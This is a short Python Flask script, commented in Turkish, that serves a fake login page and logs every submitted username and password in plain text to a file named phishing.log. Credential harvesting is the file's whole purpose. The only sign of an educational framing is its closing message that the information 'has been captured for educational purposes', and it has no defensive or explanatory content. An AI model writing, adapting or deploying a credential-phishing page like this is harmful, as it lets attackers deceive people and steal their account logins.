from flask import Flask, request, render_template_string
import logging

app = Flask(__name__)

# Logging yapılandırması
logging.basicConfig(filename='phishing.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Sahte giriş formu
login_form = """
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
</head>
<body>
    <h2>Login</h2>
    <form method="POST" action="/login">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(login_form)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Kullanıcı bilgilerini log dosyasına kaydetme
    logging.info(f"Username: {username}, Password: {password}")
    
    return "Information has been captured for educational purposes."

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)